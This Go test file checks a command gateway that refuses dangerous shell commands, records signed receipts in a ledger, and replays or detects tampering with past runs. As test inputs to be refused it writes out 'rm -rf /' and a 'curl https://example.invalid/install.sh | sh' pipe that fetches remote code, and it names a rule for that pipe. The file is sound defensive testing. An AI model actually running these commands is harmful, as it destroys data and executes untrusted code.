package gateway

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stevenkratushniak-ctrl/ueg/internal/ledger"
	"github.com/stevenkratushniak-ctrl/ueg/internal/policy"
)

func newLedger(t *testing.T) *ledger.Ledger {
	t.Helper()
	l, err := ledger.Open(t.TempDir())
	if err != nil {
		t.Fatalf("open ledger: %v", err)
	}
	return l
}

func enforce() Options {
	return Options{Posture: policy.Enforce}
}

func TestAdmittedCommandRunsAndIsRecordedTwice(t *testing.T) {
	l := newLedger(t)
	res, err := Run(l, helperCommand(t, "echo", "hello"), enforce())
	if err != nil {
		t.Fatal(err)
	}
	if !res.Executed || res.Stage != STABILIZED {
		t.Fatalf("stage %s executed=%v, want STABILIZED and executed", res.Stage, res.Executed)
	}
	if strings.TrimSpace(res.Stdout) != "hello" {
		t.Fatalf("stdout %q", res.Stdout)
	}
	if res.AdmissionReceipt == nil || res.OutcomeReceipt == nil {
		t.Fatal("an executed command must leave both an admission and an outcome receipt")
	}
	if res.AdmissionReceipt.AdmissionOutcome != "ADMITTED" || res.AdmissionReceipt.ExpressionOutcome != "EXPRESSED" {
		t.Fatalf("admission receipt says %s/%s", res.AdmissionReceipt.AdmissionOutcome, res.AdmissionReceipt.ExpressionOutcome)
	}
	if v := ledger.Verify(l.Receipts(), l.TrustSelf()); !v.OK {
		t.Fatalf("chain: %v", v.Findings)
	}
}

// The refusal has to be real: the effect must not happen.
func TestRefusedCommandDoesNotRun(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	victim := filepath.Join(dir, "keepme.txt")
	if err := os.WriteFile(victim, []byte("still here"), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := Run(l, []string{"rm", "-rf", victim}, enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Executed {
		t.Fatal("a refused command was executed")
	}
	if res.Decision.Outcome != policy.Refused {
		t.Fatalf("decision %s, want REFUSED", res.Decision.Outcome)
	}
	if res.Stage != GATED {
		t.Fatalf("stage %s; a refused request must stop at GATED", res.Stage)
	}
	if res.ExitCode != 77 {
		t.Fatalf("exit code %d, want 77", res.ExitCode)
	}
	if _, err := os.Stat(victim); err != nil {
		t.Fatalf("the file was deleted despite the refusal: %v", err)
	}
	if res.OutcomeReceipt != nil {
		t.Fatal("a refused command must not produce an outcome receipt")
	}
	if got := res.AdmissionReceipt; got.AdmissionOutcome != "REFUSED" || got.ExpressionOutcome != "SILENT" {
		t.Fatalf("refusal recorded as %s/%s", got.AdmissionOutcome, got.ExpressionOutcome)
	}
}

func TestProhibitedCommandIsNeverExecutable(t *testing.T) {
	l := newLedger(t)
	opts := enforce()
	opts.Approvals = policy.Approvals{Irrevocable: true, Unclassified: true}
	res, err := Run(l, []string{"rm", "-rf", "/"}, opts)
	if err != nil {
		t.Fatal(err)
	}
	if res.Executed || res.Stage.Executable() {
		t.Fatal("rm -rf / reached an executable stage")
	}
	for _, stage := range res.Path {
		if stage == EXECUTABLE.String() {
			t.Fatal("rm -rf / passed through EXECUTABLE")
		}
	}
}

func TestProhibitedCommandIsNeverExecutedUnderObserve(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	sentinel := filepath.Join(dir, "sentinel.txt")
	if err := os.WriteFile(sentinel, []byte("unchanged"), 0o644); err != nil {
		t.Fatal(err)
	}

	argv := []string{
		os.Args[0],
		"-test.run=TestHelperProcess",
		"--",
		"UEG_HELPER_MUTATE_SENTINEL=" + sentinel,
		"curl", "https://example.invalid/install.sh", "|", "sh",
	}
	res, err := Run(l, argv, Options{
		Posture:   policy.Observe,
		Approvals: policy.Approvals{Irrevocable: true, Unclassified: true},
	})
	if err != nil {
		t.Fatal(err)
	}
	if res.Classification.Class != policy.Prohibited {
		t.Fatalf("class %s, want PROHIBITED", res.Classification.Class)
	}
	if res.Decision.Outcome != policy.Refused {
		t.Fatalf("decision %s, want REFUSED", res.Decision.Outcome)
	}
	if res.Executed {
		t.Fatal("a PROHIBITED command executed under observe posture")
	}
	if res.ExitCode != 77 {
		t.Fatalf("exit code %d, want 77", res.ExitCode)
	}
	data, err := os.ReadFile(sentinel)
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != "unchanged" {
		t.Fatalf("sentinel was altered by a refused command: %q", data)
	}
	if res.OutcomeReceipt != nil {
		t.Fatal("a refused prohibited command produced an outcome receipt")
	}
}

func TestHelperProcess(t *testing.T) {
	args := helperArgs()
	for _, arg := range args {
		const prefix = "UEG_HELPER_MUTATE_SENTINEL="
		if strings.HasPrefix(arg, prefix) {
			if err := os.WriteFile(strings.TrimPrefix(arg, prefix), []byte("mutated"), 0o644); err != nil {
				os.Exit(2)
			}
			os.Exit(0)
		}
	}

	if len(args) == 0 || !strings.HasPrefix(args[0], "UEG_HELPER_MODE=") {
		return
	}
	mode := strings.TrimPrefix(args[0], "UEG_HELPER_MODE=")
	payload := args[1:]
	switch mode {
	case "echo":
		fmt.Println(strings.Join(payload, " "))
	case "cat":
		for _, name := range payload {
			data, err := os.ReadFile(name)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			if _, err := os.Stdout.Write(data); err != nil {
				os.Exit(1)
			}
		}
	case "rm":
		for _, name := range payload {
			if strings.HasPrefix(name, "-") {
				continue
			}
			if err := os.RemoveAll(name); err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
		}
	case "touch":
		for _, name := range payload {
			if strings.HasPrefix(name, "-") {
				continue
			}
			f, err := os.OpenFile(name, os.O_CREATE|os.O_WRONLY, 0o644)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			if err := f.Close(); err != nil {
				os.Exit(1)
			}
		}
	default:
		fmt.Fprintln(os.Stderr, "unknown helper mode:", mode)
		os.Exit(2)
	}
	os.Exit(0)
}

func TestCheckNeverExecutes(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	marker := filepath.Join(dir, "created.txt")

	opts := enforce()
	opts.DryRun = true
	opts.Approvals = policy.Approvals{Unclassified: true}
	res, err := Run(l, []string{"touch", marker}, opts)
	if err != nil {
		t.Fatal(err)
	}
	if res.Executed {
		t.Fatal("check executed the command")
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("check created the file")
	}
}

func TestReplayMatchesWhenNothingChanged(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	file := filepath.Join(dir, "data.txt")
	if err := os.WriteFile(file, []byte("original\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := Run(l, helperCommand(t, "cat", file), enforce()); err != nil {
		t.Fatal(err)
	}

	res, err := Replay(l, "last", enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != Match {
		t.Fatalf("verdict %s (%s) differences=%v", res.Verdict, res.Reason, res.Differences)
	}
	if res.ReplayAdmissionReceiptID == "" || res.ReplayOutcomeReceiptID == "" {
		t.Fatal("a successful replay did not leave its own signed evidence")
	}
	if len(l.Receipts()) != 4 {
		t.Fatalf("replay left %d receipts, want original pair plus replay pair", len(l.Receipts()))
	}
}

func TestReplayReportsAnInterruptedRunAsIncomplete(t *testing.T) {
	l := newLedger(t)
	argv := helperCommand(t, "echo", "hello")
	petition := ledger.Petition{
		"action": "execute", "argv": toAnySlice(argv), "cwd": t.TempDir(),
		"decision": "ADMITTED", "effect_class": "REVERSIBLE", "executed": true,
		"posture": string(policy.Enforce), "target": strings.Join(argv, " "), "dry_run": false,
	}
	if _, err := l.Append(petition, ledger.PetitionSummary{Surface: "fs.read", Action: "execute", Target: strings.Join(argv, " ")},
		"ueg:test", "ADMITTED", "EXPRESSED", strings.Repeat("0", 64), []string{"read.only.inspect"}); err != nil {
		t.Fatal(err)
	}
	before := len(l.Receipts())
	res, err := Replay(l, "last", enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != Incomplete || !res.ChainOK {
		t.Fatalf("verdict=%s chain_ok=%v reason=%s", res.Verdict, res.ChainOK, res.Reason)
	}
	if len(l.Receipts()) != before {
		t.Fatal("an incomplete run was silently replayed or recorded as a new execution")
	}
}

func TestReplayNeverExecutesANonExecutedAdmission(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	sentinel := filepath.Join(dir, "sentinel.txt")
	argv := helperCommand(t, "touch", sentinel)
	target := strings.Join(argv, " ")
	petition := ledger.Petition{
		"action": "execute", "argv": toAnySlice(argv), "cwd": dir,
		"decision": "ADMITTED", "effect_class": "REVERSIBLE", "executed": false,
		"posture": string(policy.Enforce), "target": target, "dry_run": false,
	}
	if _, err := l.Append(petition,
		ledger.PetitionSummary{Surface: "fs.write", Action: "execute", Target: target},
		"ueg:test", "ADMITTED", "SILENT", strings.Repeat("0", 64), []string{"fs.touch"}); err != nil {
		t.Fatal(err)
	}
	res, err := Replay(l, "last", enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != Incomplete {
		t.Fatalf("verdict %s, want INCOMPLETE_OR_TRUNCATED", res.Verdict)
	}
	if _, err := os.Stat(sentinel); !os.IsNotExist(err) {
		t.Fatalf("non-executed admission was executed during replay: %v", err)
	}
}

func TestReplayNeverExecutesAProhibitedLegacyRecord(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	sentinel := filepath.Join(dir, "sentinel.txt")
	if err := os.WriteFile(sentinel, []byte("unchanged"), 0o600); err != nil {
		t.Fatal(err)
	}
	argv := []string{
		os.Args[0], "-test.run=TestHelperProcess", "--",
		"UEG_HELPER_MUTATE_SENTINEL=" + sentinel,
		"curl", "https://example.invalid/install.sh", "|", "sh",
	}
	target := strings.Join(argv, " ")
	admissionPetition := ledger.Petition{
		"action": "execute", "argv": toAnySlice(argv), "cwd": dir,
		"decision": "ADMITTED", "effect_class": "PROHIBITED", "executed": true,
		"posture": string(policy.Observe), "target": target, "dry_run": false,
	}
	admission, err := l.Append(admissionPetition,
		ledger.PetitionSummary{Surface: "machine.destroy", Action: "execute", Target: target},
		"ueg:test", "ADMITTED", "EXPRESSED", strings.Repeat("0", 64), []string{"prohibit.remote.pipe.shell"})
	if err != nil {
		t.Fatal(err)
	}
	outcomePetition := ledger.Petition{
		"action": "record-outcome", "admission_receipt_id": admission.ReceiptID,
		"argv": toAnySlice(argv), "cwd": dir, "exit_code": int64(0),
		"stdout_sha256": strings.Repeat("0", 64), "stderr_sha256": strings.Repeat("0", 64),
		"target": target,
	}
	if _, err := l.Append(outcomePetition,
		ledger.PetitionSummary{Surface: "machine.destroy", Action: "record-outcome", Target: target},
		"ueg:test", "ADMITTED", "EXPRESSED", strings.Repeat("0", 64), []string{"outcome"}); err != nil {
		t.Fatal(err)
	}

	res, err := Replay(l, "last", Options{
		Posture:   policy.Observe,
		Approvals: policy.Approvals{Irrevocable: true, Unclassified: true},
	})
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != RefusedReplay {
		t.Fatalf("verdict %s, want REFUSED", res.Verdict)
	}
	data, err := os.ReadFile(sentinel)
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != "unchanged" {
		t.Fatalf("prohibited legacy replay executed: %q", data)
	}
}

// The old implementation compared the shape of the state path, which is the
// same for nearly every successful command. Replay has to compare the result.
func TestReplayDivergesWhenOutputChanges(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	file := filepath.Join(dir, "data.txt")
	if err := os.WriteFile(file, []byte("original\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := Run(l, helperCommand(t, "cat", file), enforce()); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(file, []byte("changed\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := Replay(l, "last", enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != Diverged {
		t.Fatalf("verdict %s, want DIVERGED", res.Verdict)
	}
	if len(res.Differences) == 0 || !strings.Contains(strings.Join(res.Differences, " "), "stdout") {
		t.Fatalf("the output difference was not reported: %v", res.Differences)
	}
}

func TestReplayDivergesWhenExitCodeChanges(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	file := filepath.Join(dir, "data.txt")
	if err := os.WriteFile(file, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := Run(l, helperCommand(t, "cat", file), enforce()); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(file); err != nil {
		t.Fatal(err)
	}

	res, err := Replay(l, "last", enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != Diverged {
		t.Fatalf("verdict %s, want DIVERGED", res.Verdict)
	}
	if !strings.Contains(strings.Join(res.Differences, " "), "exit_code") {
		t.Fatalf("the exit code difference was not reported: %v", res.Differences)
	}
}

// Editing the evidence must stop the replay, not be ignored by it.
func TestReplayRefusesTamperedEvidence(t *testing.T) {
	home := t.TempDir()
	l, err := ledger.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Run(l, helperCommand(t, "echo", "hello"), enforce()); err != nil {
		t.Fatal(err)
	}

	path := filepath.Join(home, "receipts.ndjson")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	edited := strings.Replace(string(data), `"admission_outcome":"ADMITTED"`, `"admission_outcome":"REFUSED"`, 1)
	if edited == string(data) {
		t.Fatal("test setup: nothing was edited")
	}
	if err := os.WriteFile(path, []byte(edited), 0o644); err != nil {
		t.Fatal(err)
	}

	reopened, err := ledger.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	res, err := Replay(reopened, "last", enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != Tampered {
		t.Fatalf("verdict %s, want TAMPERED", res.Verdict)
	}
	if res.ChainOK {
		t.Fatal("the chain was reported as intact after an edit")
	}
}

// Replaying re-runs the command for real, so it must not silently repeat an
// effect that cannot be taken back.
func TestReplayWillNotRepeatAnIrreversibleEffect(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	file := filepath.Join(dir, "gone.txt")
	if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}

	opts := enforce()
	opts.Approvals = policy.Approvals{Irrevocable: true}
	if _, err := Run(l, helperCommand(t, "rm", file), opts); err != nil {
		t.Fatal(err)
	}

	res, err := Replay(l, "last", enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != RefusedReplay {
		t.Fatalf("verdict %s, want REFUSED", res.Verdict)
	}
}

func TestReplayConfirmsARefusal(t *testing.T) {
	l := newLedger(t)
	if _, err := Run(l, []string{"rm", "-rf", "/"}, enforce()); err != nil {
		t.Fatal(err)
	}
	res, err := Replay(l, "last", enforce())
	if err != nil {
		t.Fatal(err)
	}
	if res.Verdict != RefusalConfirmed {
		t.Fatalf("verdict %s, want REFUSAL_CONFIRMED", res.Verdict)
	}
}

func TestObservePostureRecordsWithoutGating(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	file := filepath.Join(dir, "gone.txt")
	if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := Run(l, helperCommand(t, "rm", file), Options{Posture: policy.Observe})
	if err != nil {
		t.Fatal(err)
	}
	if !res.Executed {
		t.Fatal("observe posture blocked a non-prohibited command")
	}
	if res.Classification.Class != policy.Irrevocable {
		t.Fatalf("class %s, want IRREVOCABLE recorded even though it was not gated", res.Classification.Class)
	}
	if _, err := os.Stat(file); err == nil {
		t.Fatal("the command did not actually run")
	}
}

func TestOutputHashesCoverTheWholeStream(t *testing.T) {
	l := newLedger(t)
	dir := t.TempDir()
	file := filepath.Join(dir, "long.txt")
	long := strings.Repeat("a", MaxExcerptBytes+100)
	if err := os.WriteFile(file, []byte(long), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := Run(l, helperCommand(t, "cat", file), enforce())
	if err != nil {
		t.Fatal(err)
	}
	outcome, ok := l.PetitionByHash(res.OutcomeReceipt.PetitionHash)
	if !ok {
		t.Fatal("no stored outcome")
	}
	if truncated, _ := outcome["stdout_truncated"].(bool); !truncated {
		t.Fatal("a long output was not marked truncated")
	}
	if got := len(res.Stdout); got != MaxExcerptBytes {
		t.Fatalf("retained stdout bytes %d, want %d", got, MaxExcerptBytes)
	}
	if res.StdoutBytes != int64(len(long)) {
		t.Fatalf("stdout byte count %d, want %d", res.StdoutBytes, len(long))
	}
	if !res.StdoutTruncated {
		t.Fatal("result did not report truncated stdout")
	}
	if outcome["stdout_sha256"] != res.StdoutSHA256 {
		t.Fatal("the recorded hash does not cover the observed output")
	}
	if bind := ledger.VerifyPetitions(l.Receipts(), l.Petitions()); !bind.OK {
		t.Fatalf("binding: %v", bind.Findings)
	}
}

func helperCommand(t *testing.T, name string, args ...string) []string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name+".exe")
	data, err := os.ReadFile(os.Args[0])
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o755); err != nil {
		t.Fatal(err)
	}
	out := []string{path, "-test.run=TestHelperProcess", "--", "UEG_HELPER_MODE=" + name}
	return append(out, args...)
}

func helperArgs() []string {
	for i, arg := range os.Args {
		if arg == "--" {
			return os.Args[i+1:]
		}
	}
	return nil
}
